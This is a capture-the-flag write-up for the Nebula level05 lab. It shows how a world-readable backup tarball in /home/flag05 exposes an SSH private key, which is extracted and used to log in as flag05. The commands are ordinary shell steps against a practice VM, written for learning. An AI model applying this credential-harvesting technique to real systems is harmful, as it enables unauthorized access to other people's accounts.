# Level05

Check the **flag05** home directory. You are looking for weak directory permissions
To do this level, log in as the **level05** account with the password
**level05**. Files for this level can be found in /home/flag05.

## Source code

There is no source code available for this level.

## Solution

Let's list the contents of the /home/flag05 directory using `ls -lah /home/flag05`:

```
level05@nebula:~$ ls -lah /home/flag05
total 9.0K
drwxr-x--- 1 flag05 level05   80 Sep 13 14:42 .
drwxr-xr-x 1 root   root     200 Aug 27  2012 ..
drwxr-xr-x 2 flag05 flag05    42 Nov 20  2011 .backup
-rw------- 1 flag05 flag05    13 Sep 13 14:42 .bash_history
-rw-r--r-- 1 flag05 flag05   220 May 18  2011 .bash_logout
-rw-r--r-- 1 flag05 flag05  3.3K May 18  2011 .bashrc
drwx------ 2 flag05 flag05    60 Sep 13 14:41 .cache
-rw-r--r-- 1 flag05 flag05   675 May 18  2011 .profile
drwx------ 2 flag05 flag05    70 Nov 20  2011 .ssh

```

We see the .backup directory which we have read and execution permissions allowing us to see it's contents using the `ls` command once again:

```
level05@nebula:~$ ls -lah /home/flag05/.backup/
total 2.0K
drwxr-xr-x 2 flag05 flag05    42 Nov 20  2011 .
drwxr-x--- 1 flag05 level05   80 Sep 13 14:42 ..
-rw-rw-r-- 1 flag05 flag05  1.8K Nov 20  2011 backup-19072011.tgz
```

We have a gziped tar file named `backup-19072011.tgz`, we can check it's contents using the `tar` command with the `-t` flag

```
level05@nebula:~$ tar -tf /home/flag05/.backup/backup-19072011.tgz
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
```

So that's promising, the backup is of the .ssh directory. It contains the `authorized_keys` file and a pair of public and private rsa keys. Let's copy the tar to our home directory and unpack it:

```bash
cp /home/flag05/.backup/backup-19072011.tgz .
tar -xzf backup-19072011.tgz
```

Inspecting the contents of the `.ssh/authorized_keys` and the `id_rsa.pub` key we see that the rsa public key is the same, meaning that the flag05 account accepts ssh login using the matching private key, which is contained in the ~/.ssh/id_rsa file. So let's test this by trying to ssh into flag05 using the private key for authentication:

```bash
ssh flag05@localhost -i .ssh/id_rsa
```

And it works! We're now logged in as flag05 account and we can run the getflag command to finish the challenge.
